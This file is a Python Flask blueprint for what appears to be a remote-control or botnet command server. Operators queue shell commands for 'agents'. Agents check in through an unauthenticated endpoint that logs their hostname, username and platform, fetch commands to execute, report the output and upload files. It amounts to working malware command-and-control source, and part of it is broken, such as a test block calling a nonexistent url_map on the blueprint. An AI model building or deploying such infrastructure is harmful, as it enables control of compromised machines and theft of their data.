import os
import sys
from pathlib import Path

# Add the project root to the Python path
project_root = Path(__file__).resolve().parents[2]
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

from datetime import datetime
from flask import Blueprint, request, abort, url_for, render_template
from werkzeug.utils import secure_filename
from markupsafe import escape

# Import with error handling for when running directly
try:
    from ..webui import require_admin
    from ..models import Agent, Command, db
except ImportError as e:
    print(f"Import error: {e}")
    print(f"Current working directory: {os.getcwd()}")
    print(f"Python path: {sys.path}")
    print(f"Project root: {project_root}")
    print("\nThis file should be imported as part of a Flask application.")
    print("To run the application, look for a main Flask app file (like app.py, main.py, or run.py)")
    print("in the project root directory and run that instead.")

    # Don't exit immediately - provide more debugging info
    if __name__ == '__main__':
        print("\nDebugging info:\n")
        print("Files in project root:\n")
        try:
            for item in os.listdir(project_root):
                print(f"  {item}")
        except Exception as ex:
            print(f"  Error listing files: {ex}")

        print("\nFiles in server directory:\n")
        server_dir = project_root / 'server'
        try:
            for item in os.listdir(server_dir):
                print(f"  {item}")
        except Exception as ex:
            print(f"  Error listing server files: {ex}")

    # Create dummy functions for testing if running directly
    if __name__ == '__main__':
        print("\nCreating dummy functions for testing...\n")
        def require_admin(f):
            return f  # Dummy decorator

        class DummyQuery:
            def get(self, agent_id):
                return None

        class DummyAgent:
            query = DummyQuery()

        class DummyCommand:
            query = DummyQuery()

        class DummyDB:
            session = None

        Agent = DummyAgent
        Command = DummyCommand
        db = DummyDB()
    else:
        sys.exit(1)

api = Blueprint('api', __name__)

# Dummy geolocation function since pygeoip is unavailable
def geolocation():
    # You can integrate with a free API like ipinfo.io or ip-api.com if needed
    # The '_ip' parameter was removed as it was unused.
    return 'Local'

@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmd'])
    return ''

@api.route('/<agent_id>/console')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    return render_template('agent_console.html', agent=agent)

@api.route('/<agent_id>/hello', methods=['POST'])
def get_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(agent_id)
        db.session.add(agent)
        db.session.commit()
    # Report basic info about the agent
    info = request.json
    if info:
        if 'platform' in info:
            agent.operating_system = info['platform']
        if 'hostname' in info:
            agent.hostname = info['hostname']
        if 'username' in info:
            agent.username = info['username']
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.geolocation = geolocation()
    db.session.commit()
    # Return pending commands for the agent
    cmd_to_run = ''
    cmd = agent.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run

@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    out = request.form['output']
    agent.output += escape(out)
    db.session.add(agent)
    db.session.commit()
    return ''

@api.route('/<agent_id>/upload', methods=['POST'])
@require_admin
def upload_file(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    if 'file' in request.files:
        file = request.files['file']
        filename = secure_filename(file.filename)
        agent_dir = agent.agent_id
        store_dir = os.path.join('webui/static/uploads', agent_dir)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
        agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(agent)
        db.session.commit()
    return ''

# Add this for testing purposes only
if __name__ == '__main__':
    print("\n" + "="*50)
    print("BLUEPRINT MODULE LOADED SUCCESSFULLY")
    print("="*50)
    print("This Flask Blueprint is now ready to be imported.")
    print("Routes defined:\n")
    for rule in api.url_map.iter_rules():
        print(f"  {rule.rule} [{', '.join(rule.methods)}]")
